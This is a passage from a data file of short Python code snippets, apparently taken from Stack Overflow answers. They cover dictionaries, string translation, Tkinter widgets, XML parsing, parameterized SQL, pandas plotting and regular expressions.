    for key, value in (line.split(":"),):
        dict2[key] = value
</snippet></ROW><ROW><id>20446540</id><snippet>dict2 = {}
for line in ["1:One", "2:Two", "4:Four"]:
    key, value = line.split(":")
    dict2[key] = value
</snippet></ROW><ROW><id>20446540</id><snippet>dict()</snippet></ROW><ROW><id>20446540</id><snippet>dict2 = dict(line.split(":") for line in ["1:One", "2:Two", "4:Four"])
</snippet></ROW><ROW><id>20446656</id><snippet>dict.items()</snippet></ROW><ROW><id>20446656</id><snippet>dict.iteritems()</snippet></ROW><ROW><id>20446656</id><snippet>def replace_all(text, dic):
    for i, j in dic.items():
        text = text.replace(i, j)
    return text

my_text = "Hello everybody."

reps = {"H": "|-|", "e": "3", "o": "0"}

txt = replace_all(my_text, reps)
</snippet></ROW><ROW><id>20446656</id><snippet>str.translate()</snippet></ROW><ROW><id>20446656</id><snippet>trans_map = {ord(k): v for k, v in reps.items()}
txt = my_text.translate(trans_map)
</snippet></ROW><ROW><id>20446656</id><snippet>&gt;&gt;&gt; replace_all(my_text, reps)
'|-|3ll0 3v3ryb0dy.'
&gt;&gt;&gt; trans_map = {ord(k): v for k, v in reps.items()}
&gt;&gt;&gt; my_text.translate(trans_map)
'|-|3ll0 3v3ryb0dy.'
</snippet></ROW><ROW><id>20446961</id><snippet>'001'</snippet></ROW><ROW><id>20446961</id><snippet>1</snippet></ROW><ROW><id>20446961</id><snippet>0</snippet></ROW><ROW><id>20446961</id><snippet>'001'</snippet></ROW><ROW><id>20446961</id><snippet>chr(int('001', 2))</snippet></ROW><ROW><id>20446961</id><snippet>int('001',2).to_bytes("big", 1)</snippet></ROW><ROW><id>20446968</id><snippet>class</snippet></ROW><ROW><id>20446968</id><snippet>self</snippet></ROW><ROW><id>20446968</id><snippet>var_freq_Hz = Spinbox(self,
                          textvariable=self.freq_Hz, 
                          font=("Calibri",30),
                          justify="right",
                          bd=0,
                          bg='black',
                          fg='white', 
                          from_=0,
                          to=999, 
                          increment=self.var_x.get(),
                          width=4, 
                          relief=FLAT,
                          buttonbackground='black')
    var_freq_Hz.grid(sticky=N+W+S+E,
                     row=1,
                     column=0, 
                     columnspan=1,
                     rowspan=1, 
                     padx=5)
</snippet></ROW><ROW><id>20446968</id><snippet> self.var_freq_Hz = Spinbox(self,
                          textvariable=self.freq_Hz, 
                          font=("Calibri",30),
                          justify="right",
                          bd=0,
                          bg='black',
                          fg='white', 
                          from_=0,
                          to=999, 
                          width=4, 
                          relief=FLAT,
                          buttonbackground='black')
    self.var_freq_Hz.grid(sticky=N+W+S+E,
                     row=1,
                     column=0, 
                     columnspan=1,
                     rowspan=1, 
                     padx=5)
</snippet></ROW><ROW><id>20446968</id><snippet>def set_increment(self):
    selection = "You selected the option " + str(self.var_x.get())
    self.var_freq_Hz.config(increment = self.var_x.get())
    print selection
    return 
</snippet></ROW><ROW><id>20447043</id><snippet>def tups_to_dicts(kv_pairs):
    # split into dictionaries
    ds = []
    for key, val in kv_pairs:
        if not ds or key in ds[-1]:
            ds.append({})
        ds[-1][key] = val
    # pad the empty values
    all_seen_keys = set().union(*ds)
    ds = [{key: d.get(key, '') for key in all_seen_keys} for d in ds]
    return ds
</snippet></ROW><ROW><id>20447043</id><snippet>&gt;&gt;&gt; data = [('color','blue'),('number',3),('place','usa'),('color','yellow'),('place','canada'), ('color', 'orange'), ('sport', 'hockey')]
&gt;&gt;&gt; dd = tups_to_dicts(data)
&gt;&gt;&gt; for d in dd:
...     print d
...     
{'color': 'blue', 'sport': '', 'place': 'usa', 'number': 3}
{'color': 'yellow', 'sport': '', 'place': 'canada', 'number': ''}
{'color': 'orange', 'sport': 'hockey', 'place': '', 'number': ''}
</snippet></ROW><ROW><id>20447088</id><snippet>import tarfile
archive = tarfile.TarFile('/path/to/my/tarfile.tar')
max_size = 0
max_name = None
for file in archive.getmembers():
    if file.size &gt; max_size:
        max_size = file.size
        max_name = file.name

print(max_size)
print(max_name)
</snippet></ROW><ROW><id>20447298</id><snippet>diag = [ mat[i][i] for i in range(len(mat)) ]
</snippet></ROW><ROW><id>20447298</id><snippet>diag = [ row[i] for i,row in enumerate(mat) ]
</snippet></ROW><ROW><id>20447298</id><snippet>diag = [ row[-i-1] for i,row in enumerate(mat) ]
</snippet></ROW><ROW><id>20447298</id><snippet>if</snippet></ROW><ROW><id>20447298</id><snippet>diag = [ row[i+1] for i,row in enumerate(mat) if 0 &lt;= i+1 &lt; len(row)]
</snippet></ROW><ROW><id>20447394</id><snippet>Twitter</snippet></ROW><ROW><id>20447394</id><snippet>TwitterCall</snippet></ROW><ROW><id>20447394</id><snippet>__getattr__</snippet></ROW><ROW><id>20447394</id><snippet>AttributeError</snippet></ROW><ROW><id>20447394</id><snippet>extend_call</snippet></ROW><ROW><id>20447394</id><snippet>self.callable_cls</snippet></ROW><ROW><id>20447394</id><snippet>TwitterCall</snippet></ROW><ROW><id>20447394</id><snippet>TwitterCall</snippet></ROW><ROW><id>20447394</id><snippet>home_timeline</snippet></ROW><ROW><id>20447394</id><snippet>home_timeline()</snippet></ROW><ROW><id>20447394</id><snippet>__getattr__</snippet></ROW><ROW><id>20447394</id><snippet>__call__</snippet></ROW><ROW><id>20447436</id><snippet>new_items = []
for item in pos_list:
    if not any(x[0] == item[0] for x in expos_list):
        print("Different chromosome")
        new_items.append(item)
    elif any(x[1] &lt; item[1] &lt; x[2] or x[1] &lt; item[2] &lt; x[2]
             for x in expos_list):
        print("Discard")
    else:
        print("New")
        new_items.append(item)
expos_list.extend(new_items)
print(expos_list)
</snippet></ROW><ROW><id>20447436</id><snippet>Discard
New
Discard
Different chromosome
[['1', '10', '30'], ['1', '50', '80'], ['1', '100', '200'], ['1', '90', '98'], ['2', '25', '50']]
</snippet></ROW><ROW><id>20447459</id><snippet>http://www.mediawiki.org/xml/export-0.7/</snippet></ROW><ROW><id>20447459</id><snippet>titles = document.findall('.//title')
</snippet></ROW><ROW><id>20447459</id><snippet>titles = document.findall('.//{http://www.mediawiki.org/xml/export-0.7/}title')
</snippet></ROW><ROW><id>20447459</id><snippet>namespaces</snippet></ROW><ROW><id>20447459</id><snippet>NSMAP = {'mw':'http://www.mediawiki.org/xml/export-0.7/'}
titles = document.findall('.//mw:title', namespaces=NSMAP)
</snippet></ROW><ROW><id>20447459</id><snippet>iterparse()</snippet></ROW><ROW><id>20447459</id><snippet>(event, element)</snippet></ROW><ROW><id>20447459</id><snippet>for e in etree.iterparse(file_name):
    print e.tag
</snippet></ROW><ROW><id>20447459</id><snippet>for e in etree.iterparse(file_name):
    print e[1].tag
</snippet></ROW><ROW><id>20447472</id><snippet>urllib.request</snippet></ROW><ROW><id>20447472</id><snippet>#!/usr/bin/env python3
from urllib.request import urlopen

try:
     with urlopen("http://apache.domain.com/get.php?id=1001") as response:
          print("Has content" if response.read(1) else "Content Empty")
except OSError as e:
    print("error happened: {}".format(e))
</snippet></ROW><ROW><id>20447507</id><snippet>property</snippet></ROW><ROW><id>20447507</id><snippet>foo.thumbnail.allow_tags</snippet></ROW><ROW><id>20447507</id><snippet>foo.thumbnail()</snippet></ROW><ROW><id>20447507</id><snippet>foo.thumbnail.allow_tags</snippet></ROW><ROW><id>20447516</id><snippet>T(n) = 2T(n/2) + c
T(1) = 1
</snippet></ROW><ROW><id>20447516</id><snippet>T(n) = 2^k * T(n/2^k) + (2^k - 1) * c
T(1) = 1
</snippet></ROW><ROW><id>20447516</id><snippet>n/2^k == 1</snippet></ROW><ROW><id>20447516</id><snippet>k == logN</snippet></ROW><ROW><id>20447516</id><snippet>T(n) = 2^logN * T(1) + (2^logN - 1) * c
</snippet></ROW><ROW><id>20447516</id><snippet>T(1) = 1</snippet></ROW><ROW><id>20447516</id><snippet>T(n) = n * 1 + (n-1) * c
T(n) = n + n * c
T(n) = n * (1+c)
T(n) = O(n)
</snippet></ROW><ROW><id>20447516</id><snippet>O(n*logn)</snippet></ROW><ROW><id>20447516</id><snippet>mergesort</snippet></ROW><ROW><id>20447516</id><snippet>c</snippet></ROW><ROW><id>20447516</id><snippet>n*O(1) = O(n)</snippet></ROW><ROW><id>20447608</id><snippet>final = [word for word in map(str.lower, mywords)
         if word not in string.punctuation and word not in stopset]
</snippet></ROW><ROW><id>20447608</id><snippet>stopset = ['if']</snippet></ROW><ROW><id>20447608</id><snippet> ['today', 'cold', 'outside', '2013', 'december']
</snippet></ROW><ROW><id>20447800</id><snippet>subprocess.check_output(...)</snippet></ROW><ROW><id>20447894</id><snippet>parseString</snippet></ROW><ROW><id>20447894</id><snippet>parse</snippet></ROW><ROW><id>20447894</id><snippet>parseString</snippet></ROW><ROW><id>20447894</id><snippet>parse</snippet></ROW><ROW><id>20447894</id><snippet>playlist = minidom.parseString(playlist_xml)
</snippet></ROW><ROW><id>20448091</id><snippet>sql = "INSERT INTO players (pid,position,club,points,price,availability,rating,name) VALUES (%s, %s, %s, %s, %s, %s, %s, %s)"
params = (count, position, club, points, s, availability, rating, name)
cur.execute(sql, params)
</snippet></ROW><ROW><id>20448091</id><snippet>%s</snippet></ROW><ROW><id>20448091</id><snippet>MySQLdb</snippet></ROW><ROW><id>20448091</id><snippet>cursor.execute()</snippet></ROW><ROW><id>20448091</id><snippet>db = MySQLdb.connect(host="localhost", user="root", passwd="hassan28", 
                     db="adbpro", charset='utf8')
</snippet></ROW><ROW><id>20448180</id><snippet>quit</snippet></ROW><ROW><id>20448180</id><snippet>def saveConfig():
    global config

    config.set('Default', 'Param1', e1.get())
    config.set('Default', 'Blah7', e2.get())
    config.set('Default', 'Param3', e3.get())
    config.write(open('config.ini','w'))

    root.quit()

Button(root, "QUIT", command=saveConfig)
</snippet></ROW><ROW><id>20448180</id><snippet>closing event</snippet></ROW><ROW><id>20448180</id><snippet>root.protocol("WM_DELETE_WINDOW", saveConfig)
</snippet></ROW><ROW><id>20448180</id><snippet>for</snippet></ROW><ROW><id>20448180</id><snippet> entries = []
 options = []

 entries.append(Entry(f1)); entries[-1].grid(row=1,column=1,sticky=W)
 options.append("Param1")

 entries.append(Entry(f1)); entries[-1].grid(row=2,column=1,sticky=W)
 options.append("Blah7")

 entries.append(Entry(f1)); entries[-1].grid(row=3,column=1,sticky=W)
 options.append("Param3")

 # load

 import ConfigParser
 config = ConfigParser.ConfigParser()
 config.read('config.ini')

 for index, e in enumerate(entries):
     e.insert(0, config.get("Default", options[index]) )

 # save

 for index, e in enumerate(entries):
     config.set("Default", options[index], e.get())

 config.write(open('config.ini','w'))
</snippet></ROW><ROW><id>20448319</id><snippet>66. class Avatar(models.Model):
67.     user = models.ForeignKey(getattr(settings, 'AUTH_USER_MODEL', 'auth.User'))
68.     ....
</snippet></ROW><ROW><id>20448481</id><snippet>animalName = input("&gt;")
</snippet></ROW><ROW><id>20448481</id><snippet>Marmadukke</snippet></ROW><ROW><id>20448481</id><snippet>animalName = Marmadukke #Not defined.
</snippet></ROW><ROW><id>20448481</id><snippet>try/except</snippet></ROW><ROW><id>20448481</id><snippet>try:    
        animalName = input("&gt;")
except:    
    print("Invalid input!")
</snippet></ROW><ROW><id>20448481</id><snippet>animals = {}

animals['Marmaduke'] = Cat("Marmaduke",True)
animals['Timmy'] = Cat("Timmy",False)
animals['Cerberus'] = Dog("Cerberus",True)
animals['Max'] = Dog("Max",False)
</snippet></ROW><ROW><id>20448481</id><snippet>animalName = animals[raw_input("&gt;")]
</snippet></ROW><ROW><id>20448481</id><snippet>KeyError</snippet></ROW><ROW><id>20448481</id><snippet>NameError</snippet></ROW><ROW><id>20448673</id><snippet>print self.sortByGenre()
</snippet></ROW><ROW><id>20448673</id><snippet>self</snippet></ROW><ROW><id>20448673</id><snippet>def sortByGenre(self, FoundMedia):
    ...
</snippet></ROW><ROW><id>20448673</id><snippet>FoundMedia</snippet></ROW><ROW><id>20448702</id><snippet>re.split</snippet></ROW><ROW><id>20448702</id><snippet>&gt;&gt;&gt; import re
&gt;&gt;&gt; s = "C BOS  - Traded from Royal Disappointments"
&gt;&gt;&gt; re.split(r'\s*-\s*', s)
['C BOS', 'Traded from Royal Disappointments']
</snippet></ROW><ROW><id>20448702</id><snippet>&gt;&gt;&gt; new1, new2 = re.split(r'\s*-\s*', s)
&gt;&gt;&gt; new1
'C BOS'
&gt;&gt;&gt; new2
'Traded from Royal Disappointments'
</snippet></ROW><ROW><id>20448702</id><snippet>&gt;&gt;&gt; map(str.strip, s.split('-'))
['C BOS', 'Traded from Royal Disappointments']
</snippet></ROW><ROW><id>20448702</id><snippet>-</snippet></ROW><ROW><id>20448702</id><snippet>re.split</snippet></ROW><ROW><id>20448702</id><snippet>&gt;&gt;&gt; s = "C BOS  - Traded from Royal Disappointments  -  foobar"
&gt;&gt;&gt; re.split(r'\s*-\s*', s, 1)
['C BOS', 'Traded from Royal Disappointments  -  foobar']
</snippet></ROW><ROW><id>20448707</id><snippet>name    | date       | users                   | email
Matthew | 12-07-2013 | ['James','Sandy','May'] | matthew@whatever.com
</snippet></ROW><ROW><id>20448707</id><snippet>name    | date       | email
Matthew | 12-07-2013 | matthew@whatever.com
</snippet></ROW><ROW><id>20448707</id><snippet>index   | name       | user
1       | Matthew    | James
2       | Matthew    | Sandy
3       | Matthew    | May
</snippet></ROW><ROW><id>20448717</id><snippet>.start()</snippet></ROW><ROW><id>20448717</id><snippet>.run()</snippet></ROW><ROW><id>20448717</id><snippet>.start()</snippet></ROW><ROW><id>20448854</id><snippet>ModuleForm</snippet></ROW><ROW><id>20448854</id><snippet>goal</snippet></ROW><ROW><id>20448854</id><snippet>CharField</snippet></ROW><ROW><id>20448854</id><snippet>''</snippet></ROW><ROW><id>20448854</id><snippet>goal = forms.IntegerField(...)</snippet></ROW><ROW><id>20448854</id><snippet>port</snippet></ROW><ROW><id>20448854</id><snippet>maxDisplay</snippet></ROW><ROW><id>20448977</id><snippet>assert [t[0] for t in list1] == range(len(list1))
assert [t[0] for t in list2] == range(len(list2))
</snippet></ROW><ROW><id>20448977</id><snippet>[integer, string]</snippet></ROW><ROW><id>20448977</id><snippet>import difflib
s = difflib.SequenceMatcher(None,
                            [t[1] for t in list1],
                            [t[1] for t in list2])
for b in s.get_matching_blocks():
    print "exact match of length", b.size, "starting at indices", b.a, "and", b.b
</snippet></ROW><ROW><id>20448977</id><snippet>exact match of length 3 starting at indices 0 and 0
exact match of length 56 starting at indices 3 and 4
exact match of length 17 starting at indices 59 and 62
exact match of length 3 starting at indices 76 and 80
exact match of length 1 starting at indices 79 and 84
exact match of length 1 starting at indices 80 and 86
exact match of length 2 starting at indices 82 and 87
exact match of length 33 starting at indices 84 and 92
exact match of length 3 starting at indices 117 and 126
exact match of length 2 starting at indices 120 and 130
exact match of length 2 starting at indices 122 and 133
exact match of length 9 starting at indices 124 and 136
exact match of length 0 starting at indices 133 and 145
</snippet></ROW><ROW><id>20448977</id><snippet>.get_matching_blocks()</snippet></ROW><ROW><id>20449044</id><snippet>choice</snippet></ROW><ROW><id>20449044</id><snippet>random</snippet></ROW><ROW><id>20449044</id><snippet>readlines()</snippet></ROW><ROW><id>20449044</id><snippet>    if len(bank)==445:
        bank = []

    text_file = open("text.txt", "r")
    lines = text_file.readlines()

    line = random.choice(lines) # choose a random line

    twitter.update_status(
        status=line)
    text_file.close()
</snippet></ROW><ROW><id>20449068</id><snippet>grid = [[None]*20]*20 will give you a list of 20 sublists, each of which contains 20</snippet></ROW><ROW><id>20449068</id><snippet>grid = [[None for _ in xrange(20)] for __ in xrange(20)]
</snippet></ROW><ROW><id>20449068</id><snippet>None</snippet></ROW><ROW><id>20449087</id><snippet>pandas</snippet></ROW><ROW><id>20449087</id><snippet>import numpy as np
import pandas as pd
import datetime as dt
import matplotlib.pyplot as plt

# one minute interval
start = dt.datetime.now( )
end = start + dt.timedelta( minutes=1 )

# sin curve at seconds frequancy
idx1 = pd.date_range( start, end, freq='S' )
ts1 = pd.Series( np.sin( np.linspace( 0, 4 * np.pi, len( idx1 ) ) ), index=idx1 )

# cosine curve at milisecond frequency
idx2 = pd.date_range( start, end, freq='L' )
ts2 = pd.Series( np.cos( np.linspace( 0, 4 * np.pi, len( idx2 ) ) ), index=idx2 )
</snippet></ROW><ROW><id>20449087</id><snippet>len( ts1 ) = 61</snippet></ROW><ROW><id>20449087</id><snippet>len( ts2 ) = 6001</snippet></ROW><ROW><id>20449087</id><snippet>fig = plt.figure( figsize=(8, 6) )
ax = fig.add_axes( [.05, .05, .9, .9] )

ts1.plot( ax, color='DarkBlue' )
ts2.plot( ax, color='DarkRed' )

# reindex ts2 like ts1
ts2 = ts2.reindex_like( ts1 )
(ts1 - ts2).plot( ax, color='DarkGreen' )
</snippet></ROW><ROW><id>20449087</id><snippet>import statsmodels.api as sm
n = 1000
x = np.linspace( 0, 1, n )
y = np.random.randn( n ).cumsum( )
z = sm.nonparametric.lowess( y, x, return_sorted=False, frac=.05)

ax.plot( x, y, 'Blue', linestyle='--' )
ax.plot( x, z, color='DarkRed' )
</snippet></ROW><ROW><id>20449101</id><snippet>fetchall()</snippet></ROW><ROW><id>20449101</id><snippet>fetchone()</snippet></ROW><ROW><id>20449101</id><snippet>def track_exists(self, track_id):
    cur = self.conn.cursor()
    cur.execute("SELECT fma_track_id FROM tracks WHERE fma_track_id = %s", (track_id,))
    return cur.fetchone() is not None
</snippet></ROW><ROW><id>20449101</id><snippet>fetchone()</snippet></ROW><ROW><id>20449101</id><snippet>None</snippet></ROW><ROW><id>20449101</id><snippet>is not None</snippet></ROW><ROW><id>20449248</id><snippet>args = ['add_phenotype.py', '-t', threads, '-s']
if zeroed_out_file:
    args.append('-z')

subprocess.call(args)
</snippet></ROW><ROW><id>20449248</id><snippet>args</snippet></ROW><ROW><id>20449253</id><snippet>import sys

# Python 2/3 compatibility shim
if sys.hexversion &gt;= 0x3000000:
    inp = input
    rng = range
else:
    inp = raw_input
    rng = xrange

def get_int(prompt):
    while True:
        try:
            return int(inp(prompt))
        except ValueError:
            pass

class Book:
    @classmethod
    def from_prompt(cls):
        title  = inp('Enter title: ').strip()
        author = inp('Enter author: ').strip()
        pages  = get_int('Page count: ')
        date   = inp('Publication date: ').strip()
        return cls(title, author, pages, date)

    def __init__(self, title, author, pages, date):
        self.title  = title
        self.author = author
        self.pages  = pages
        self.date   = date

    def __str__(self):
        return "Book: {title}\nAuthor: {author}\nPage count: {pages}\nPublish Date: {date}".format(
            title=self.title, author=self.author, pages=self.pages, date=self.date
        )

class Library:
    def __init__(self, books=None):
        self.books = []
        self.title_index = {}
        if books:
            for book in books:
                self.add(book)

    def add(self, book):
        self.books.append(book)
        self.title_index[book.title] = book

    def find_title(self, title):
        return self.title_index.get(title, None)

    def __str__(self):
        return '\n\n'.join(str(book) for book in self.books)

def main():
    #
    # You get to write this part,
    # but here are some code examples:
    #
    lib = Library()

    book1 = Book('Fun with Dick and Jane', 'May Hill Arbuthnot', 160, '1951')
    lib.add(book1)

    book2 = Book('The Adventures of Pinocchio', 'Carlo Collodi', 171, '1911')
    lib.add(book2)

    # prompt for book 3 information
    book3 = Book.from_prompt()
    lib.add(book3)

    # find a book and display its information
    print('='*30)
    print(lib.find_title('The Adventures of Pinocchio'))

    # display the whole library contents
    print('='*30)
    print(lib)

if __name__=="__main__":
    main()
</snippet></ROW><ROW><id>20449321</id><snippet>&gt;&gt;&gt; text = '9 17 4 8 11 18 13\n'
&gt;&gt;&gt; len(text) // 2
9
&gt;&gt;&gt; text[:9]
'9 17 4 8 '
&gt;&gt;&gt; text[9:]
'11 18 13\n'
</snippet></ROW><ROW><id>20449321</id><snippet>&gt;&gt;&gt; text = '9 17 4 8 11 18 13'
&gt;&gt;&gt; len(text)
17
&gt;&gt;&gt; len(text) // 2
8
&gt;&gt;&gt; text[:8]
'9 17 4 8'
&gt;&gt;&gt; text[8:]
' 11 18 13'
</snippet></ROW><ROW><id>20449321</id><snippet>&gt;&gt;&gt; parts = text.split()
&gt;&gt;&gt; parts
['9', '17', '4', '8', '11', '18', '13']
&gt;&gt;&gt; parts[:len(parts)//2]
['9', '17', '4']
&gt;&gt;&gt; parts[len(parts)//2:]
['8', '11', '18', '13']
</snippet></ROW><ROW><id>20449368</id><snippet>import os
&gt;&gt;&gt; path,file=os.path.split('http://www.adbongo.com/wp-content/uploads/2013/09/digital-bongo.jpg')
&gt;&gt;&gt; file
'digital-bongo.jpg'
</snippet></ROW><ROW><id>20449371</id><snippet>Request</snippet></ROW><ROW><id>20449371</id><snippet>yield</snippet></ROW><ROW><id>20449371</id><snippet>return</snippet></ROW><ROW><id>20449371</id><snippet>def parse_player(self, response):
    ...... 
    yield Request(......)
</snippet></ROW><ROW><id>20449371</id><snippet>def parse_player(self, response):
    ......
    res_objs = []
    # then add every Request object into 'res_objs' list,
    # and in the end of the method, do the following:
    for req in res_objs:
        yield req
</snippet></ROW><ROW><id>20449371</id><snippet># handle requests
for req_obj in self.parse_play():
    # do something with *Request* object
</snippet></ROW><ROW><id>20449371</id><snippet>Request</snippet></ROW><ROW><id>20449433</id><snippet>int</snippet></ROW><ROW><id>20449433</id><snippet>x = int(input("Enter a number: "))
y = int(input("Enter a number: "))
</snippet></ROW><ROW><id>20449433</id><snippet>;</snippet></ROW><ROW><id>20449445</id><snippet>graph</snippet></ROW><ROW><id>20449445</id><snippet>def graph(numX, xWidth, scaleY, radius=2):
    minY = 0
    offsetX = -200
    for xVal in range(numX):

        x = offsetX + (xVal*xWidth)
        rand = random.random()
        y = minY + int(rand*scaleY)
        turtle.penup()
        turtle.goto(x,y)
        turtle.pendown()
        turle.circle(radius)

graph(20, 20, 100, 5)

turtle.mainloop()
</snippet></ROW><ROW><id>20449516</id><snippet>zip()</snippet></ROW><ROW><id>20449516</id><snippet>ID</snippet></ROW><ROW><id>20449516</id><snippet>def List_Value_Removal(old, reference, ID):
    return [v for v, ref in zip(old, reference) if ref != ID]

 values, references = List_Value_Removal(values, references, some_id)
</snippet></ROW><ROW><id>20449516</id><snippet>&gt;&gt;&gt; old = [2, 2, 6, 6, 2, 4, 6, 6, 8, 2]
&gt;&gt;&gt; reference = [7, 1, 6, 2, 4, 9, 10, 16, 12, 5]
&gt;&gt;&gt; ID = 2
&gt;&gt;&gt; [v for v, ref in zip(old, reference) if ref != ID]
[2, 2, 6, 2, 4, 6, 6, 8, 2]
</snippet></ROW><ROW><id>20449516</id><snippet>reference</snippet></ROW><ROW><id>20449516</id><snippet>def List_Value_Removal(old, reference, ID):
    return zip(*((v, ref) for v, ref in zip(old, reference) if ref != ID))
</snippet></ROW><ROW><id>20449516</id><snippet>&gt;&gt;&gt; new, newref = zip(*((v, ref) for v, ref in zip(old, reference) if ref != ID))
&gt;&gt;&gt; new
(2, 2, 6, 2, 4, 6, 6, 8, 2)
&gt;&gt;&gt; newref
(7, 1, 6, 4, 9, 10, 16, 12, 5)
</snippet></ROW><ROW><id>20449656</id><snippet>gzip.GzipFile()</snippet></ROW><ROW><id>20449656</id><snippet>import gzip
import json

# writing
with gzip.GzipFile(jsonfilename, 'w') as outfile:
    for obj in objects:
        outfile.write(json.dumps(obj) + '\n')

# reading
with gzip.GzipFile(jsonfilename, 'r') as isfile:
    for line in infile:
        obj = json.loads(line)
        # process obj
</snippet></ROW><ROW><id>20449761</id><snippet>r.text</snippet></ROW><ROW><id>20449761</id><snippet>r.content</snippet></ROW><ROW><id>20449761</id><snippet>stream=True</snippet></ROW><ROW><id>20449761</id><snippet>r.raw</snippet></ROW><ROW><id>20449802</id><snippet>X-Accel-Redirect</snippet></ROW><ROW><id>20449889</id><snippet>tree = ET.parse('unified.xml')
root = tree.getroot()
for child in root.findall('object'):
    for tag in child.findall('tag'):
        print tag.text
</snippet></ROW><ROW><id>20450124</id><snippet>payment.create()</snippet></ROW><ROW><id>20450124</id><snippet>payment.id</snippet></ROW><ROW><id>20450124</id><snippet>  for link in payment.links:
    if link.method == "REDIRECT":
      redirect_url = link.href
      print("Redirect for approval: %s"%(redirect_url))
</snippet></ROW><ROW><id>20450124</id><snippet>payment.id</snippet></ROW><ROW><id>20450124</id><snippet>PayerID</snippet></ROW><ROW><id>20450124</id><snippet>return_url</snippet></ROW><ROW><id>20450187</id><snippet>import matplotlib.pylab as plt
import numpy as np
import scipy.integrate as integrate

##Parameters
kp = .5 #proportional gain
ki = .1 #integral gain
vr = 25 #desired velocity in m/s
Tm = 190 #Max Torque in Nm
wm = 420 #engine speed
B = 0.4 #Beta
an = 12 #at gear 4
p = 1.3 #air density
Cd = 0.32 #Drag coefficient
Cr = .01 #Coefficient of rolling friction
A = 2.4 #frontal area

##Variables
m = 18000.0 #weight
v0 = 20. #starting velocity
t = np.linspace(61, 500, 5000) #time
theta = np.radians(4) #Theta

def torque(v):    
    return Tm * (1 - B*(an*v/wm - 1)**2)  

def vderivs(status, t):
    v, int_err = status

    err = vr - v
    control = kp * err + ki * int_err

    v1 = an * control * torque(v)
    v2 = m*Cr*np.sign(v)
    v3 = 0.5*p*Cd*A*v**2
    v4 = m*np.sin(theta)
    vtot = v1-v2-v3-v4*(t&gt;=200)
    return vtot/m, err

def velocity(desired, theta, time):
    return integrate.odeint(vderivs, [desired, 0], time)[:, 0]

t0l = [i for i in range(61)]
vf=[v0 for i in range(61)]+[v for v in velocity(v0,theta,t)]
tf=t0l+[time for time in t]

plt.plot(tf, vf, 'k-', label=('V(0) = '+str(v0)))

v0=35.
vf=[v0 for i in range(61)]+[v for v in velocity(v0,theta,t)]
plt.plot(tf, vf, 'b-', label=('V(0) = '+str(v0)))

v0=vr
vf=[v0 for i in range(61)]+[v for v in velocity(v0,theta,t)]
plt.plot(tf, vf, 'g-', label=('V(0) = Vr'))

plt.axhline(y=vr, xmin=0, xmax=1000, color='r', label='Desired Velocity')
plt.legend(loc = "upper right")
plt.axis([0,500,18,36])
plt.show()
</snippet></ROW><ROW><id>20450436</id><snippet>&gt;&gt;&gt; data1 = np.array([[0,0,0],[0,1,1],[1,0,1],[1,1,0]])
&gt;&gt;&gt; print [[x[:2].tolist(), x[2:].tolist()] for x in data1]
[[[0, 0], [0]],
 [[0, 1], [1]],
 [[1, 0], [1]],
 [[1, 1], [0]]]
</snippet></ROW><ROW><id>20450540</id><snippet>'(%g,%g)'</snippet></ROW><ROW><id>20450540</id><snippet>(blank.x,blank.y)</snippet></ROW><ROW><id>20450540</id><snippet>%g</snippet></ROW><ROW><id>20450540</id><snippet>%g</snippet></ROW><ROW><id>20450540</id><snippet>%</snippet></ROW><ROW><id>20450685</id><snippet>&gt;&gt;&gt; def foo(a, b, c='foo'):
...     pass
... 
&gt;&gt;&gt; foo(a="cat", b="bar")
&gt;&gt;&gt; foo(1, c="bar")
Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
TypeError: foo() takes at least 2 arguments (2 given)
</snippet></ROW><ROW><id>20450714</id><snippet> all(lst[0] == item for item in lst)
</snippet></ROW><ROW><id>20450714</id><snippet>list_subscript</snippet></ROW><ROW><id>20450714</id><snippet>list_slice</snippet></ROW><ROW><id>20450774</id><snippet>&lt;form action="{% url 'tracking:order_detail' order.id %}" method="POST"&gt;
        &lt;div id="buttons"&gt;
            &lt;input type="submit" class="f" name="action:3.4" value="Some State"&gt;
            &lt;input type="submit" class="f" name="action:3.5" value="Another State"&gt;
            &lt;div style="clear:both"&gt;&lt;/div&gt;&lt;!-- Need this to have the buttons actually inside div#buttons --&gt;
        &lt;/div&gt;
&lt;/form&gt;
</snippet></ROW><ROW><id>20450774</id><snippet>if 'action:3.4' in request.POST:
    action = '3.4'
...    
</snippet></ROW><ROW><id>20450774</id><snippet>action = None
for key in request.POST.keys():
    if key.startswith('action:'):
        action = key[7:]
        break
</snippet></ROW><ROW><id>20450788</id><snippet>'%s %s %s %s %s %s %s' % x for x in attribute_name)
</snippet></ROW><ROW><id>20450788</id><snippet>'%s %s %s %s %s %s %s' % tuple(x for x in attribute_name))
</snippet></ROW><ROW><id>20450788</id><snippet>f.write('\n'.join('%s %s %s %s %s %s %s' % x for x in attribute_name))
</snippet></ROW><ROW><id>20450788</id><snippet>join</snippet></ROW><ROW><id>20450788</id><snippet>&gt;&gt;&gt; '\n'.join('1234')
'1\n2\n3\n4'
</snippet></ROW><ROW><id>20450788</id><snippet>f.write('%s %s %s %s %s %s %s\n' % tuple(x for x in attribute_name)) 
</snippet></ROW><ROW><id>20450788</id><snippet>f.write('%s %s %s %s %s %s %s\n' % tuple(attribute_name)) # convert list to tuple
</snippet></ROW><ROW><id>20450788</id><snippet>'parameters: %s %s' %('param0', 'param1')
</snippet></ROW><ROW><id>20450788</id><snippet>'parameters: %s' %('param0')
'parameters: %s' %'param0'
</snippet></ROW><ROW><id>20450788</id><snippet>&gt;&gt;&gt; lst = [1, 2]
&gt;&gt;&gt; '%d %d' % lst # this shall fail since the parameter list type doesn't match
Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
TypeError: %d format: a number is required, not list
&gt;&gt;&gt; '%d %d' %tuple(lst) # while this shall work
'1 2'
&gt;&gt;&gt; tuple(lst) # this generates a tuple from lst
(1, 2)
</snippet></ROW><ROW><id>20451060</id><snippet>__bases__</snippet></ROW><ROW><id>20451060</id><snippet>class D(A, B, C):
    def foo(self):
        print "foo from D"
        for cls in D.__bases__:
            cls().foo("D")
</snippet></ROW><ROW><id>20451060</id><snippet>foo from D
foo from A, call from D
foo from B, call from D
foo from C, call from D
</snippet></ROW><ROW><id>20451270</id><snippet>.*</snippet></ROW><ROW><id>20451270</id><snippet>?</snippet></ROW><ROW><id>20451270</id><snippet>&gt;&gt;&gt; re.findall(r'&lt;i&gt;(.*?)&lt;/i&gt;', 'test &lt;i&gt;abc&lt;/i&gt; &lt;i&gt;def&lt;/i&gt;')
['abc', 'def']
